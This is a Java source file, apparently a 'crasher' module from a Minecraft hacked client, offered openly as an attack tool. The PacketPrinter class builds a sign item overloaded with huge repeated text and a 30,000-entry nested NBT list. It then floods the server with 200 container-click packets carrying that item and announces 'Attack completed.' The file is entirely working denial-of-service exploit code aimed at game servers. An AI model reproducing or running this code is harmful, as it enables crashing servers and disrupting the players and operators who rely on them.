package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.helpers.BypassHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;

import java.util.ArrayList;
import java.util.List;

public class PacketPrinter extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private boolean enabled = false;
    private int packets = 200;
    private int size = 8192;

    public PacketPrinter() {
        super();
    }

    @Override
    public String getName() {
        return "PacketPrinter";
    }

    @Override
    public String getDescription() {
        return "Sign NBT spam exploit";
    }

    @Override
    public String getArgsUsage() {
        return "<packets> <size>";
    }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Packets", OptionType.INTEGER, new String[]{"200"}));
        options.add(new OptionUtil("Size", OptionType.INTEGER, new String[]{"8192"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) {
            try {
                this.packets = Integer.parseInt(values[0]);
            } catch (Exception ignored) {}
        }
        if (values.length > 1) {
            try {
                this.size = Integer.parseInt(values[1]);
            } catch (Exception ignored) {}
        }
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null || mc.player.containerMenu == null) {
            msgHelper.sendMessage("&cError: Player, network or container not ready!", true);
            setEnabled(false);
            return;
        }

        msgHelper.sendMessage("&fStarting: &6PacketPrinter", true);

        final int packetCount = this.packets;
        final int repeatSize = this.size;
        final ItemStack payload = buildSignStack(repeatSize);
        final int containerId = mc.player.containerMenu.containerId;
        final int slotId = 20;

        new Thread(() -> {
            for (int i = 0; i < packetCount; i++) {
                ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
                    containerId,
                    0,
                    slotId,
                    0,
                    ClickType.PICKUP,
                    payload,
                    new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
                );

                mc.getConnection().send(packet);

                try {
                    Thread.sleep(1);
                } catch (InterruptedException ignored) {}
            }
            msgHelper.sendMessage("&aAttack completed.", true);
            setEnabled(false);
        }, "PacketPrinter-Sender").start();
    }

    private ItemStack buildSignStack(int size) {
        ItemStack stack = new ItemStack(Items.OAK_SIGN, 1);
        CompoundTag root = new CompoundTag();
        String spam = "XYNIS_CLIENT // ENHANCED // 1.20.2";
        String repeated = spam.repeat(Math.max(1, size / Math.max(1, spam.length())));

        root.putString("Text1", "\u00a7r\u00a7c" + repeated);
        root.putString("Text2", "\u00a7r\u00a7c" + repeated);
        root.putString("Text3", "\u00a7r\u00a7c" + repeated);
        root.putString("Text4", "\u00a7r\u00a7c" + repeated);

        CompoundTag nested = new CompoundTag();
        ListTag bigList = new ListTag();
        int overflowCount = 30000;
        for (int i = 0; i < overflowCount; i++) {
            bigList.add(new CompoundTag());
        }
        nested.put("Overflow", bigList);
        root.put("EXTRA", nested);

        stack.setTag(root);
        return stack;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }
}
